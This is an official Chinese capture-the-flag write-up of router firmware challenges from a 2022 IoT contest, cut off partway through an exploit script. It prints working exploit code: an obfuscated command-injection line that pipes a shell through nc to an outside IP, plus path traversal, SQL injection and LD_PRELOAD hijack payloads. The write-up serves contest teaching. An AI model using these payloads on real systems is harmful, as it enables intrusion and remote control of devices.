---
title: 2022西湖论剑 IoT-AWD 赛题官方 WriteUp （上篇）：一号固件&二号固件
url: https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247493801&idx=1&sn=d3f98938ae8df76c28accc580a4e6c17&chksm=f9ed8416ce9a0d00c54d8ab9749e7d76792b82b06780ae103b3879c154b80654e0c4ef3c1881&scene=58&subscene=0#rd
source: 网络安全研究宅基地
date: 2023-03-28
fetch_date: 2025-10-04T10:53:16.751089
---

# 2022西湖论剑 IoT-AWD 赛题官方 WriteUp （上篇）：一号固件&二号固件

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/AvAjnOiazvneoSyIFj3XyXD6xjx04LGR06uXJQRVlNlKb5MWECXkO7BXNsmSz51T34icah0PYdPCIKObTgePT8Tw/0?wx_fmt=jpeg)

# 2022西湖论剑 IoT-AWD 赛题官方 WriteUp （上篇）：一号固件&二号固件

海特实验室

网络安全研究宅基地

**点击蓝字 关注我们**

本届西湖论剑比赛延续了在IoT真实硬件设备上进行解题的竞赛风格，采用了 AWD 攻防赛模式，比赛期间为每个参赛队伍提供一个海特开源路由设备（HatLab Gateboard-One）作为靶标环境。该设备预设若干系统漏洞，参赛队伍可利用不同漏洞对其他队伍得设备发起攻击以获得分数，同时对该设备进行加固防护，避免被其他参赛队伍攻击成功而丢失分数。

比赛提供了四份固件（其中一份是备份固件，比赛时暂未放出），每个固件提供了若干道赛题，下面是各个固件的赛题WriteUp。本文为1号和2号固件。

**一号固件**

***1***

**easybluetooth**

蓝牙连接工具可以使用ble-serial。

通过ble-scan扫描周围蓝牙设备，带有HZCSSC的就是目标设备。然后用ble-serial -d进行连接，连接之后会将蓝牙串口映射到本地

ble-serial -d 00:00:00:00:00:FF

10:32:39.713 | INFO | linux\_pty.py: Port endpoint created on /tmp/ttyBLE -> /dev/pts/4

10:32:39.713 | INFO | ble\_interface.py: Receiver set up

10:32:39.950 | INFO | ble\_interface.py: Trying to connect with 00:00:00:00:00:FF: HZCSSC-0000000000ff

10:32:41.672 | INFO | ble\_interface.py: Device 00:00:00:00:00:FF connected

10:32:41.672 | INFO | ble\_interface.py: Found write characteristic 0000ffe1-0000-1000-8000-00805f9b34fb (H. 4)

10:32:41.672 | INFO | ble\_interface.py: Found notify characteristic 0000ffe1-0000-1000-8000-00805f9b34fb (H. 4)

10:32:41.777 | INFO | main.py: Running main loop!

10:33:00.364 | WARNING | ble\_interface.py: Device 00:00:00:00:00:FF disconnected

10:33:00.365 | INFO | ble\_interface.py: Stopping Bluetooth event loop

10:33:00.365 | WARNING | main.py: Shutdown initiated

10:33:00.365 | INFO | linux\_pty.py: Serial reader and symlink removed

10:33:00.365 | INFO | main.py: Shutdown complete.

然后通过串口工具(如linux的screen，mac的minicom)访问/tmp/ttyBLE就可以进入到题目中。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3ybibicAtt8SKdUiamcicjms2mlibwiaLAJMgOjxoBDWfbnlxHjjyovkaDlOjmQ/640?wx_fmt=png)

通过字符串匹配可以找到第一个文件是eblec，文件会将收集的数据通过ubus传输到nc\_device的服务端，这个在ebles文件中。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3ybRNZrVo55G1ibiaWp7K4FDNyfydPGEToaG0licrCN0n959ib64f7O1MROXg/640?wx_fmt=png)

在ebles接收数据后有一个将小写字母转成大写字母的操作，之后就是system命令注入。小写字母转成大写字母可以通过环境变量绕过。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3ybPQP4xWJEZTFkib2qabxGb9BdqH8OTibGqxc3ibiaMNA6SLyOEaQb8uZh7g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3ybUgSqznb5CPHxhllFOEcbPwJpJDibSadQNgWGTD5oVibVBl3RH2TjIia8g/640?wx_fmt=png)

poc如下：

import os

import time

def readuntile(f,context):

    while True:

        buf=f.readline(len(context))

        if buf==context:

            break

os.system("ble-serial -d `ble-scan | grep HZCSSC |head -n 1 | awk '{print $1}'` &")

time.sleep(10)

f=open("/tmp/ttyBLE",'rw+')

readuntile(f,"input time:")

f.write("11\n")

readuntile(f,"input port:")

f.write("1234\n")

readuntile(f,"input ip:")

f.write(";${PATH:10:8}/${PATH:8:1}? 192.168.132.2 2333 |${PATH:14:4}${PATH:4:2}?| ${PATH:10:8}/${PATH:8:1}? 192.168.132.2 4000;\n")

f.close()

**xhttpd**

查看开放的端口信息看到 8080 端口运行了 web 服务，该 web 服务基于 boa 修改而来，配置文件：/etc/boa/boa.conf

Port 8080

User root

Group root

ErrorLog /tmp/error\_log

AccessLog /tmp/access\_log

ServerName www.your.org.here

DocumentRoot /usr/bin/www

UserDir public\_html

DirectoryIndex index.html

KeepAliveMax 1000

KeepAliveTimeout 10

MimeTypes /etc/mime.types

DefaultType text/plain

CGIPath /bin:/usr/bin:/usr/local/bin

ScriptAlias /cgi-bin/ /usr/bin/www/cgi-bin/

web 路径位于 /usr/bin/www，且 /cgi-bin/ 被定向到 /usr/bin/www/cgi-bin/ 下

在 /usr/bin/www/cgi-bin/ 目录中可以看到一些 cgi 程序，分析 get.cgi，主要功能

int sub\_408098()

{

  FILE \*stream; // [sp+18h] [+18h]

  char v2[128]; // [sp+1Ch] [+1Ch] BYREF

  char v3[40]; // [sp+9Ch] [+9Ch] BYREF

  char v4[1028]; // [sp+C4h] [+C4h] BYREF

  strcpy(v2, "/usr/bin/upload/");

  get\_cgi("name", v3, 30);

  strcat(v2, v3);

  stream = fopen(v2, "rb");

  if ( !stream )

    return fwrite("

File not found

\n", 1u, 0x16u, dword\_419154);

  memset(v4, 0, 0x400u);

  fread(v4, 0x400u, 1u, stream);

  fclose(stream);

  fprintf(dword\_419154, v4);

  return system("rm -rf /usr/bin/upload/\*");

}

代码从用户请求中读取 name 参数，拼接出路径直接 fopen 打开文件读出内容返回，缺少对路径穿越的限制，可以利用此漏洞直接读取 flag

分析 upload.cgi

size\_t sub\_4080B8()

{

  FILE \*s; // [sp+18h] [+18h]

  int v2; // [sp+1Ch] [+1Ch] BYREF

  char v3[2048]; // [sp+20h] [+20h] BYREF

  char v4[1024]; // [sp+820h] [+820h] BYREF

  size\_t v5; // [sp+C20h] [+C20h] BYREF

  char v6[132]; // [sp+C24h] [+C24h] BYREF

  if ( get\_cgi\_0("file", v3, 1024) )

    return puts("

No file was uploaded.

");

  if ( strlen(v3) >= 0x19 )

    return puts("

Wrong parameter

");

  if ( sub\_404248("file", &v2) )

    return fwrite("Could not open the file.

\n", 1u, 0x1Cu, dword\_419154);

  strcpy(v6, "/usr/bin/upload/");

  strcat(v6, v3);

  s = fopen(v6, "wb");

  while ( !sub\_4043C8(v2, v4, 1024, &v5) )

    fwrite(v4, v5, 1u, s);

  fclose(s);

  return sub\_404480(v2);

}

此接口读取用户输入的 file 参数以及文件内容，利用 file 参数拼接路径，打开对应文件写入内容。

此处也缺少路径穿越验证，可通过此接口实现任意文件写入。

分析 diag.cgi

size\_t sub\_4083B0()

{

  char v1[28]; // [sp+18h] [+18h] BYREF

  char v2[68]; // [sp+34h] [+34h] BYREF

  sub\_403D98("type", v1, 20);

  sub\_403D98("param", v2, 64);

  if ( filter(v2) )

    return fwrite("

wrong parameter

\n", 1u, 0x17u, dword\_419154);

  if ( !strncmp(v1, "ping", 4u) )

  {

    exec\_ping(v2);

  }

  else if ( !strncmp(v1, "curl", 4u) )

  {

    exec\_curl(v2);

  }

  return fwrite("done\n", 1u, 5u, dword\_419154);

}

此接口使用用户可控的参数拼接命令执行，虽然对参数有字符过滤，但是过滤时没有考虑换行符，导致存在命令注入漏洞。

分析 xhttpd 程序，可以参考 boa 源代码辅助分析。

主要变更的一些位置

// 1. 请求头处理部分

else if ( strcmp(v11, "ACCEPT") )

      {

        v10 = memcmp(v11, "AUTHORIZATION", 0xDu);

        if ( v10 )

          return sub\_45BB78(a1, v11, v4, 0);

        if ( strlen(v4) >= 0x101 || strncasecmp(v4, "Basic ", 6u) || (v12 = strchr(v4, ':')) == 0 )

        {

          sub\_460034(a1);

          return v10;

        }

        \*v12 = 0;

        a1[36] = strdup(v4 + 6);

        a1[37] = strdup(v12 + 1);

      }

// 2. 设置环境变量，add\_cgi\_env 函数的最后一个参数被设置为 0，不添加 HTTP\_ 前缀

if ( v6 == 0x48 )

    {

      if ( strcmp(v11, "HOST") || a1[24] )

        return add\_cgi\_env(a1, v11, v4, 0);

      a1[24] = v4;

      return 1;

    }

// 3. 添加身份验证

  v8 = \*(a1 + 144);

  if ( !v8 )

    goto LABEL\_9;

  if ( !\*(a1 + 148) )

    goto LABEL\_9;

  memset(v15, 0, sizeof(v15));

  if ( db\_query(v15, v8) )

    goto LABEL\_9;

设置环境变量时未添加 HTTP\_ 前缀，用户可以控制 LD\_PRELOAD 变量实现链接库劫持。而身份验证部分会使用用户提交的数据拼接 SQL 语句执行，存在 SQL 注入漏洞

int \_\_fastcall sub\_45F4F4(int a1, const char \*a2)

{

  const char \*v3; // $v0

  int v4; // $s1

  int v7; // [sp+2Ch] [-41Ch] BYREF

  const char \*v8; // [sp+30h] [-418h] BYREF

  char v9[1024]; // [sp+34h] [-414h] BYREF

  v7 = 0;

  v8 = 0;

  if ( sub\_45A9BC("/tmp/user.db", &v7) )

  {

    v3 = sub\_41FED4(v7);

    fprintf(stderr, "Cannot open database: %s\n", v3);

  }

  else

  {

    strcpy(v9, "SELECT \* FROM User where Name='");

    strcat(v9, a2);

    strcat(v9, "';");

    v4 = sub\_44895C(v7, v9, &loc\_45EE64 + 1, a1, &v8);

    if ( !v4 )

    {

      sub\_433CB8(v7);

      return v4;

    }

    fputs("Failed to select data\n", stderr);

    fprintf(stderr, "SQL error: %s\n", v8);

    sub\_407498(v8);

  }

  v4 = 1;

  sub\_433CB8(v7);

  return v4;

}

/tmp/user.db 中默认保存了一 admin 账户，该账户密码随机，利用 SQL 注入可以读出 admin 账户的密码，进行后续利用。

总结一下，本题有 3 种简单解法

1

利用 get.cgi 任意文件读取漏洞直接读取 flag

2

通过 SQL 注入漏洞获取 admin 账户的密码，再访问 diag.cgi 进行命令注入

3

利用 upload.cgi 上传一恶意链接库文件，再控制 LD\_PRELOAD 环境变量去加载此文件

EXP

#include

#include

static void demo(void) \_\_attribute\_\_((constructor));

static void demo(void)

{

    printf("Hello\n");

    FILE\* fp = fopen("/dev/ttyUSB0", "r");

    char flag[100];

    fread(flag, 100, 1, fp);

    printf("%s\n", flag);

    fclose(fp);

}

import socket

import sys

import string

def method1():

    s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)

    s.connect((IP, 8080))

    data = "GET /cgi-bin/get.cgi?name=/../../../dev/ttyUSB0 HTTP/1.1\r\nHost: %s\r\n...